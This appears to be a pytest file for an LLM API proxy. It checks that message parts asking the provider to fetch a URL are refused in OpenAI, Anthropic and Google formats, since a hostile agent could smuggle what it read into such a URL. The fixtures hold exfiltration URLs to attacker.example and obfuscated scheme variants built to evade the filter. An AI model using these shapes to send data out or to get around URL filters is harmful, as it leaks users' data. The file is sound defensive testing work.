# SPDX-License-Identifier: LicenseRef-Proprietary

"""No message part may make the provider fetch a URL (#950).

The conversation is opaque to the proxy (#810), so a part that names a URL used to reach the
provider, which fetches it: a hostile agent could put what it read into the URL. The proxy now
refuses such a part in every wire family and lets inline content through. These tests are the shapes
of each family (refused, with the path of the part and never its value), the inline shapes that must
keep working, the agent's own JSON that is never read, and the proxy end to end (refused before
anything is reserved or sent; a stream with inline content untouched).
"""

import json
import re
import sys
from pathlib import Path
from typing import Any

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from passthrough_support import MODEL, rig, streamed

from code_reviewer_runner.dynamic_review.passthrough.admission import (
    Admission,
    PassthroughTarget,
    RefusalCode,
    Refused,
)
from code_reviewer_runner.dynamic_review.passthrough.families import WireFamily, spec_of
from code_reviewer_runner.result import ErrorCode

CAPABILITY = "c" * 43
ALLOWANCE = 8192
# A marker no real secret looks like: what an agent would smuggle into the URL.
LEAK = "d=exfiltrated-marker"
URL = f"https://attacker.example/pixel.png?{LEAK}"
BASE64 = "iVBORw0KGgo="
DATA_URL = f"data:image/png;base64,{BASE64}"
CHAT, RESPONSES, MESSAGES, GOOGLE = (
    WireFamily.OPENAI_CHAT,
    WireFamily.OPENAI_RESPONSES,
    WireFamily.ANTHROPIC_MESSAGES,
    WireFamily.GOOGLE,
)


def body_of(family: WireFamily, *conversation: dict[str, Any], **top: Any) -> dict[str, Any]:
    """A body of the closed schema of `family` holding `conversation` as its messages."""
    if family is GOOGLE:
        return {
            "contents": list(conversation),
            "generationConfig": {"maxOutputTokens": 1000},
            **top,
        }
    holder = "input" if family is RESPONSES else "messages"
    cap = "max_output_tokens" if family is RESPONSES else "max_tokens"
    return {"model": MODEL, "stream": True, cap: 1000, holder: list(conversation), **top}


def admission(family: WireFamily) -> Admission:
    target = PassthroughTarget(family=family, model=MODEL, output_allowance=ALLOWANCE)
    return Admission(target, CAPABILITY)


def check(family: WireFamily, document: dict[str, Any]) -> Refused | None:
    body = json.dumps(document).encode()
    headers = [
        (spec_of(family).key_header, spec_of(family).key_value(CAPABILITY)),
        ("content-length", str(len(body))),
    ]
    instance = admission(family)
    head = instance.head("POST", spec_of(family).engine_target(MODEL), headers, 1 << 20)
    try:
        instance.body(head, body)
    except Refused as refused:
        return refused
    return None


def user(*parts: Any, role: str = "user") -> dict[str, Any]:
    return {"role": role, "content": list(parts)}


# (id, family, conversation, the path the refusal names)
URL_PARTS: list[tuple[str, WireFamily, list[dict[str, Any]], str]] = [
    (
        "chat-image-url",
        CHAT,
        [user({"type": "image_url", "image_url": {"url": URL}})],
        "messages[0].content[0].image_url (url source)",
    ),
    (
        "chat-image-url-string",
        CHAT,
        [user({"type": "text", "text": "x"}, {"type": "image_url", "image_url": URL})],
        "messages[0].content[1].image_url (url source)",
    ),
    (
        "chat-video-url",
        CHAT,
        [user({"type": "video_url", "video_url": {"url": URL}})],
        "messages[0].content[0].video_url (url source)",
    ),
    (
        "chat-file-url",
        CHAT,
        [user({"type": "file", "file_url": URL})],
        "messages[0].content[0].file_url (url source)",
    ),
    (
        "chat-tool-result-parts",
        CHAT,
        [
            {
                "role": "tool",
                "tool_call_id": "c1",
                "content": [{"type": "image_url", "image_url": {"url": URL}}],
            }
        ],
        "messages[0].content[0].image_url (url source)",
    ),
    (
        "responses-input-image",
        RESPONSES,
        [user({"type": "input_image", "image_url": URL})],
        "input[0].content[0].image_url (url source)",
    ),
    (
        "responses-input-file",
        RESPONSES,
        [user({"type": "input_text", "text": "x"}, {"type": "input_file", "file_url": URL})],
        "input[0].content[1].file_url (url source)",
    ),
    (
        "responses-function-output",
        RESPONSES,
        [
            {
                "type": "function_call_output",
                "call_id": "c1",
                "output": [{"type": "input_image", "image_url": URL}],
            }
        ],
        "input[0].output[0].image_url (url source)",
    ),
    (
        "messages-image",
        MESSAGES,
        [user({"type": "image", "source": {"type": "url", "url": URL}})],
        "messages[0].content[0].source (url source)",
    ),
    (
        "messages-document",
        MESSAGES,
        [
            user({"type": "text", "text": "x"}),
            user({"type": "document", "source": {"type": "url", "url": URL}}),
        ],
        "messages[1].content[0].source (url source)",
    ),
    (
        "messages-tool-result-image",
        MESSAGES,
        [
            user(
                {
                    "type": "tool_result",
                    "tool_use_id": "t1",
                    "content": [{"type": "image", "source": {"type": "url", "url": URL}}],
                }
            )
        ],
        "messages[0].content[0].content[0].source (url source)",
    ),
    (
        "messages-document-content-source",
        MESSAGES,
        [
            user(
                {
                    "type": "document",
                    "source": {
                        "type": "content",
                        "content": [{"type": "image", "source": {"type": "url", "url": URL}}],
                    },
                }
            )
        ],
        "messages[0].content[0].source.content[0].source (url source)",
    ),
    (
        "chat-file-data-url",
        CHAT,
        [user({"type": "file", "file": {"filename": "a.pdf", "file_data": URL}})],
        "messages[0].content[0].file.file_data (url source)",
    ),
    (
        "responses-file-data-url",
        RESPONSES,
        [user({"type": "input_file", "filename": "a.pdf", "file_data": URL})],
        "input[0].content[0].file_data (url source)",
    ),
    (
        "chat-image-url-case-variant",
        CHAT,
        [user({"type": "image_url", "Image_Url": {"url": URL}})],
        "messages[0].content[0].Image_Url (url source)",
    ),
    (
        "chat-image-url-camel-case",
        CHAT,
        [user({"type": "image_url", "imageUrl": URL})],
        "messages[0].content[0].imageUrl (url source)",
    ),
    (
        "chat-unfamiliar-url-key",
        CHAT,
        [user({"type": "pdf_url", "pdf_url": {"url": URL}})],
        "messages[0].content[0].pdf_url (url source)",
    ),
    (
        "chat-unfamiliar-uri-key",
        CHAT,
        [user({"type": "thumb", "thumbnail-uri": URL})],
        "messages[0].content[0].thumbnail-uri (url source)",
    ),
    (
        "responses-unfamiliar-nesting",
        RESPONSES,
        [user({"type": "input_x", "payload": {"url": URL}})],
        "input[0].content[0].payload.url (url source)",
    ),
    (
        "messages-url-beside-another-source-type",
        MESSAGES,
        [user({"type": "image", "source": {"type": "base64", "url": URL}})],
        "messages[0].content[0].source.url (url source)",
    ),
    (
        "chat-args-outside-a-function-call",
        CHAT,
        [user({"type": "x", "args": {"image_url": URL}})],
        "messages[0].content[0].args.image_url (url source)",
    ),
    (
        "google-response-outside-a-function-response",
        GOOGLE,
        [{"role": "user", "parts": [{"unknown": {"response": {"fileUri": URL}}}]}],
        "contents[0].parts[0].unknown.response.fileUri (url source)",
    ),
    (
        "google-file-data",
        GOOGLE,
        [{"role": "user", "parts": [{"fileData": {"mimeType": "image/png", "fileUri": URL}}]}],
        "contents[0].parts[0].fileData.fileUri (url source)",
    ),
    (
        "google-file-data-snake-case",
        GOOGLE,
        [{"role": "user", "parts": [{"file_data": {"file_uri": "gs://bucket/object"}}]}],
        "contents[0].parts[0].file_data.file_uri (url source)",
    ),
    (
        "google-function-response-part",
        GOOGLE,
        [
            {
                "role": "user",
                "parts": [
                    {
                        "functionResponse": {
                            "name": "read",
                            "response": {"output": "x"},
                            "parts": [{"fileData": {"fileUri": URL}}],
                        }
                    }
                ],
            }
        ],
        "contents[0].parts[0].functionResponse.parts[0].fileData.fileUri (url source)",
    ),
]


# #950-T01
@pytest.mark.parametrize(
    ("family", "conversation", "path"),
    [pytest.param(f, c, p, id=i) for i, f, c, p in URL_PARTS],
)
def test_a_part_that_makes_the_provider_fetch_a_url_is_refused_with_its_path(
    family: WireFamily, conversation: list[dict[str, Any]], path: str
) -> None:
    refused = check(family, body_of(family, *conversation))
    assert refused is not None
    assert (refused.status, refused.code) == (403, RefusalCode.REQUEST_NOT_ALLOWED)
    assert refused.error is ErrorCode.DYNAMIC_POLICY_VIOLATION
    assert refused.where == path
    # What the agent put into the URL is in no word of the refusal.
    assert LEAK not in str(refused.where) and LEAK not in str(refused)


# #950-T02
def test_the_system_prompt_and_the_instruction_are_searched_too() -> None:
    system = [{"type": "image", "source": {"type": "url", "url": URL}}]
    refused = check(MESSAGES, body_of(MESSAGES, user({"type": "text", "text": "x"}), system=system))
    assert refused is not None and refused.where == "system[0].source (url source)"
    instruction = {"parts": [{"fileData": {"fileUri": URL}}]}
    refused = check(GOOGLE, body_of(GOOGLE, user(), systemInstruction=instruction))
    assert refused is not None
    assert refused.where == "systemInstruction.parts[0].fileData.fileUri (url source)"


INLINE: list[tuple[str, WireFamily, list[dict[str, Any]]]] = [
    ("chat-data-url", CHAT, [user({"type": "image_url", "image_url": {"url": DATA_URL}})]),
    ("chat-data-url-string", CHAT, [user({"type": "image_url", "image_url": DATA_URL})]),
    (
        "chat-input-audio",
        CHAT,
        [user({"type": "input_audio", "input_audio": {"data": BASE64, "format": "wav"}})],
    ),
    ("responses-data-url", RESPONSES, [user({"type": "input_image", "image_url": DATA_URL})]),
    (
        "responses-file-data",
        RESPONSES,
        [user({"type": "input_file", "filename": "a.pdf", "file_data": DATA_URL})],
    ),
    ("responses-file-id", RESPONSES, [user({"type": "input_file", "file_id": "file-abc"})]),
    (
        "messages-base64",
        MESSAGES,
        [
            user(
                {
                    "type": "image",
                    "source": {"type": "base64", "media_type": "image/png", "data": BASE64},
                },
                {
                    "type": "tool_result",
                    "tool_use_id": "t1",
                    "content": [
                        {
                            "type": "image",
                            "source": {"type": "base64", "media_type": "image/png", "data": BASE64},
                        }
                    ],
                },
            )
        ],
    ),
    (
        "messages-text-source",
        MESSAGES,
        [
            user(
                {
                    "type": "document",
                    "source": {"type": "text", "media_type": "text/plain", "data": "x"},
                }
            )
        ],
    ),
    (
        "google-inline-data",
        GOOGLE,
        [
            {
                "role": "user",
                "parts": [{"inlineData": {"mimeType": "image/png", "data": BASE64}}],
            }
        ],
    ),
    (
        "chat-file-data-base64",
        CHAT,
        [user({"type": "file", "file": {"filename": "a.pdf", "file_data": BASE64}})],
    ),
    (
        "chat-file-data-data-uri",
        CHAT,
        [user({"type": "file", "file": {"file_data": "data:application/pdf;base64," + BASE64}})],
    ),
    ("chat-file-id", CHAT, [user({"type": "file", "file": {"file_id": "file-abc"}})]),
    (
        "responses-file-data-base64",
        RESPONSES,
        [user({"type": "input_file", "filename": "a.pdf", "file_data": BASE64})],
    ),
    # What a provider answered and the engine sends back: a citation is a record, not a fetch.
    (
        "chat-annotations-echo",
        CHAT,
        [
            {
                "role": "assistant",
                "content": "x",
                "annotations": [
                    {"type": "url_citation", "url_citation": {"url": URL, "title": "t"}}
                ],
            }
        ],
    ),
    (
        "responses-annotations-echo",
        RESPONSES,
        [
            {
                "role": "assistant",
                "content": [
                    {
                        "type": "output_text",
                        "text": "x",
                        "annotations": [{"type": "url_citation", "url": URL, "title": "t"}],
                    }
                ],
            }
        ],
    ),
    (
        "messages-citations-echo",
        MESSAGES,
        [
            {
                "role": "assistant",
                "content": [
                    {
                        "type": "text",
                        "text": "x",
                        "citations": [{"type": "web_search_result_location", "url": URL}],
                    }
                ],
            }
        ],
    ),
    (
        "messages-search-result-source-string",
        MESSAGES,
        [
            user(
                {
                    "type": "search_result",
                    "source": URL,
                    "title": "t",
                    "content": [{"type": "text", "text": "x"}],
                }
            )
        ],
    ),
    # A URL as plain text is only text: the provider does not fetch it.
    ("chat-url-in-text", CHAT, [user({"type": "text", "text": f"see {URL}"})]),
    ("messages-url-in-string-content", MESSAGES, [{"role": "user", "content": f"see {URL}"}]),
    ("google-url-in-text", GOOGLE, [{"role": "user", "parts": [{"text": f"see {URL}"}]}]),
]


# #950-T03
@pytest.mark.parametrize(
    ("family", "conversation"), [pytest.param(f, c, id=i) for i, f, c in INLINE]
)
def test_inline_content_and_text_pass(
    family: WireFamily, conversation: list[dict[str, Any]]
) -> None:
    assert check(family, body_of(family, *conversation)) is None


# The agent's own JSON is never read: the provider does not fetch from a tool call's arguments.
FREE_FORM: list[tuple[str, WireFamily, list[dict[str, Any]]]] = [
    (
        "messages-tool-use-input",
        MESSAGES,
        [
            {
                "role": "assistant",
                "content": [
                    {
                        "type": "tool_use",
                        "id": "t1",
                        "name": "write",
                        "input": {"image_url": URL, "source": {"type": "url", "url": URL}},
                        "caller": {"type": "direct"},
                    }
                ],
            }
        ],
    ),
    (
        "chat-tool-call-arguments",
        CHAT,
        [
            {
                "role": "assistant",
                "tool_calls": [
                    {
                        "id": "c1",
                        "type": "function",
                        "function": {
                            "name": "write",
                            "arguments": json.dumps({"image_url": {"url": URL}}),
                        },
                    }
                ],
            }
        ],
    ),
    (
        "responses-function-call-arguments",
        RESPONSES,
        [
            {
                "type": "function_call",
                "call_id": "c1",
                "name": "write",
                "arguments": json.dumps({"file_url": URL}),
            }
        ],
    ),
    (
        "google-function-call-args",
        GOOGLE,
        [
            {
                "role": "model",
                "parts": [{"functionCall": {"name": "write", "args": {"fileUri": URL}}}],
            },
            {
                "role": "user",
                "parts": [
                    {"functionResponse": {"name": "write", "response": {"fileUri": URL}}},
                ],
            },
        ],
    ),
    (
        "google-function-call-snake-case",
        GOOGLE,
        [
            {
                "role": "model",
                "parts": [{"function_call": {"name": "write", "args": {"file_uri": URL}}}],
            },
            {
                "role": "user",
                "parts": [{"function_response": {"name": "write", "response": {"url": URL}}}],
            },
        ],
    ),
    (
        "chat-legacy-function-call-arguments",
        CHAT,
        [{"role": "assistant", "function_call": {"name": "w", "arguments": {"url": URL}}}],
    ),
]


# #950-T04
@pytest.mark.parametrize(
    ("family", "conversation"), [pytest.param(f, c, id=i) for i, f, c in FREE_FORM]
)
def test_the_arguments_and_results_of_a_tool_call_are_the_agents_own_json_and_not_read(
    family: WireFamily, conversation: list[dict[str, Any]]
) -> None:
    assert check(family, body_of(family, *conversation)) is None


# #950-T05
@pytest.mark.parametrize("family", list(WireFamily))
def test_a_shape_the_walk_does_not_expect_is_passed_over(family: WireFamily) -> None:
    conversation: list[dict[str, Any]] = [
        {"anything": {"at": ["all", 1, None, True, 1.5]}},
        {"role": 5, "content": None, "image_url": None, "source": "https://example.com/a.png"},
        {"role": "user", "content": [{"image_url": ""}, {"source": {"type": "base64"}}]},
        {},
    ]
    assert check(family, body_of(family, *conversation)) is None


# #950-T06
def test_a_refusal_names_a_key_only_when_it_is_short_and_plain() -> None:
    odd = "x" * 60
    conversation = [user({odd: {"deep": [{"source": {"type": "url", "url": URL}}]}})]
    refused = check(MESSAGES, body_of(MESSAGES, *conversation))
    assert refused is not None
    assert refused.where == "messages[0].content[0].<key>.deep[0].source (url source)"


# #950-T07
@pytest.mark.parametrize("family", list(WireFamily))
def test_a_url_part_is_refused_by_the_proxy_before_anything_is_reserved_or_sent(
    family: WireFamily,
) -> None:
    conversation = next(c for _, f, c, _ in URL_PARTS if f is family)
    r = rig(family, streamed(family))
    sink = r.post(json.dumps(body_of(family, *conversation)).encode())
    assert sink.status == 403
    answer = b"".join(sink.chunks)
    assert RefusalCode.REQUEST_NOT_ALLOWED.value.encode() in answer
    assert LEAK.encode() not in answer
    assert r.upstream.requests == []
    assert r.ledger.failure is not None
    assert r.ledger.failure.code is ErrorCode.DYNAMIC_POLICY_VIOLATION
    assert LEAK not in str(r.ledger.failure)
    assert r.ledger.usage(MODEL).ai_calls == 0


# #950-T08
@pytest.mark.parametrize("family", list(WireFamily))
def test_a_turn_with_an_inline_image_still_streams_untouched(family: WireFamily) -> None:
    conversation = next(c for _, f, c in INLINE if f is family and "audio" not in str(c))
    answer = streamed(family)
    r = rig(family, answer)
    # Padded like the bodies of the relay tests: the reservation covers what the fake stream states.
    padding = {"role": "user", "content": "x" * 6000}
    if family is GOOGLE:
        padding = {"role": "user", "parts": [{"text": "x" * 6000}]}
    body = json.dumps(body_of(family, padding, *conversation)).encode()
    sink = r.post(body)
    assert sink.status == 200 and sink.ended and not sink.aborted
    assert sink.body == b"".join(c for c in answer.chunks if isinstance(c, bytes))
    # The bytes that went out are the bytes that came in.
    assert r.upstream.requests[0].body == body
    assert r.ledger.failure is None


# #950-T09: the schemes a provider fetches from, however the value is written
@pytest.mark.parametrize(
    "value",
    [
        "http://attacker.example/a?" + LEAK,
        "HTTPS://attacker.example/a?" + LEAK,
        "  https://attacker.example/a?" + LEAK,
        "\n\thttps://attacker.example/a?" + LEAK,
        "gs://bucket/" + LEAK,
        "s3://bucket/" + LEAK,
        "ftp://attacker.example/" + LEAK,
        "Data-Not:" + LEAK,
    ],
)
@pytest.mark.parametrize("family", [CHAT, RESPONSES])
def test_a_file_data_with_any_url_scheme_is_refused(family: WireFamily, value: str) -> None:
    part: dict[str, Any] = {"type": "input_file", "file_data": value}
    if family is CHAT:
        part = {"type": "file", "file": {"file_data": value}}
    refused = check(family, body_of(family, user(part)))
    assert refused is not None and str(refused.where).endswith("file_data (url source)")
    assert LEAK not in str(refused.where)


# #950-T10: a data: URI is inline whatever its case or leading space
@pytest.mark.parametrize("value", [DATA_URL, " " + DATA_URL, DATA_URL.upper(), ""])
def test_a_data_uri_is_inline_for_every_url_key(value: str) -> None:
    parts = [
        {"image_url": {"url": value}},
        {"Image_Url": value},
        {"file": {"file_data": value}},
        {"some_new_uri": value},
    ]
    for part in parts:
        assert check(CHAT, body_of(CHAT, user(part))) is None


# #950-T10b: `file_data` is base64 by contract and has no scheme
def test_bare_base64_in_file_data_passes() -> None:
    assert check(CHAT, body_of(CHAT, user({"file": {"file_data": BASE64}}))) is None


def _documented_refusals() -> list[str]:
    """The keys `docs/implementer.md` names in the Refused column of the table of #950."""
    text = (Path(__file__).resolve().parents[3] / "docs" / "implementer.md").read_text()
    section = text.split("### What the door refuses in a message (#950)", 1)[1]
    section = section.split("\n## ", 1)[0]
    keys: list[str] = []
    for line in section.splitlines():
        cells = [cell.strip() for cell in line.strip().strip("|").split("|")]
        if line.startswith("|") and len(cells) == 3 and cells[0] not in ("Family", "---"):
            for span in re.findall(r"`([^`]+)`", cells[1]):
                name = re.match(r"[A-Za-z_][\w.]*", span)
                assert name is not None, f"a code span of the table is not a key: {span}"
                keys.append(name.group(0).split(".")[-1])
    return keys


# #950-T11: the table of the doc and the walk cannot drift apart
def test_every_key_the_doc_says_is_refused_is_refused_by_the_walk() -> None:
    keys = _documented_refusals()
    assert {"image_url", "file_url", "file_data", "fileUri", "file_uri", "source"} <= set(keys)
    for key in keys:
        value: Any = {"type": "url", "url": URL} if key == "source" else URL
        for family in WireFamily:
            part = {"type": "x", key: value}
            document = (
                body_of(family, {"role": "user", "parts": [part]})
                if family is GOOGLE
                else body_of(family, user(part))
            )
            refused = check(family, document)
            assert refused is not None, (family, key)
            assert str(refused.where).endswith("(url source)")


# #950-T12: the engine is told what kind of part it was, never which value
@pytest.mark.parametrize("family", list(WireFamily))
def test_the_engine_is_told_a_part_asks_the_provider_to_fetch_a_url(family: WireFamily) -> None:
    conversation = next(c for _, f, c, _ in URL_PARTS if f is family)
    r = rig(family, streamed(family))
    sink = r.post(json.dumps(body_of(family, *conversation)).encode())
    answer = b"".join(sink.chunks).decode()
    assert "a message part asks the provider to fetch a URL" in answer
    assert LEAK not in answer and "attacker" not in answer
    assert r.ledger.failure is not None
    assert "a message part asks the provider to fetch a URL" in str(r.ledger.failure)


# #950-T20: `file_data` passes only as base64 or a data: URI; every other text is refused,
# whatever a provider's URL detection would make of it.
@pytest.mark.parametrize(
    "value",
    [
        "ht\ttps://attacker.example/a?" + LEAK,
        "h\nttps://attacker.example/a?" + LEAK,
        "\u00a0https://attacker.example/a?" + LEAK,
        "\ufeffhttps://attacker.example/a?" + LEAK,
        "//attacker.example/a?" + LEAK,
        "\\\\attacker.example\\a?" + LEAK,
        "www.attacker.example/a?" + LEAK,
        "attacker.example/a?" + LEAK,
    ],
)
@pytest.mark.parametrize("family", [CHAT, RESPONSES])
def test_a_file_data_that_is_not_base64_is_refused(family: WireFamily, value: str) -> None:
    part: dict[str, Any] = {"type": "input_file", "file_data": value}
    if family is CHAT:
        part = {"type": "file", "file": {"file_data": value}}
    refused = check(family, body_of(family, user(part)))
    assert refused is not None and str(refused.where).endswith("file_data (url source)")


# #950-T21: base64 split over lines (as some encoders write it) still passes
def test_base64_split_over_lines_passes_in_file_data() -> None:
    value = "iVBORw0K\nGgoAAAAN\r\nSUhEUgAA"
    assert check(CHAT, body_of(CHAT, user({"file": {"file_data": value}}))) is None


# #950-T22: an unfamiliar `…url`/`…uri` key: a scheme split by a tab or a new line, a
# scheme-relative address, a list of URLs and a plural key are refused too
@pytest.mark.parametrize(
    "part",
    [
        {"pdf_url": "ht\ttps://attacker.example/a?" + LEAK},
        {"pdf_url": "//attacker.example/a?" + LEAK},
        {"pdf_url": ["https://attacker.example/a?" + LEAK]},
        {"image_urls": ["https://attacker.example/a?" + LEAK]},
        {"source_uris": "https://attacker.example/a?" + LEAK},
    ],
)
def test_an_unfamiliar_url_key_in_any_form_is_refused(part: dict[str, Any]) -> None:
    assert check(CHAT, body_of(CHAT, user(part))) is not None


# #950-T23: a `type` that is not a text is a refused request, not a crash of the walk
def test_a_type_that_is_not_a_text_is_refused_not_a_crash() -> None:
    refused = check(CHAT, body_of(CHAT, user({"type": [], "input": "x"})))
    assert refused is None or refused.code is not None
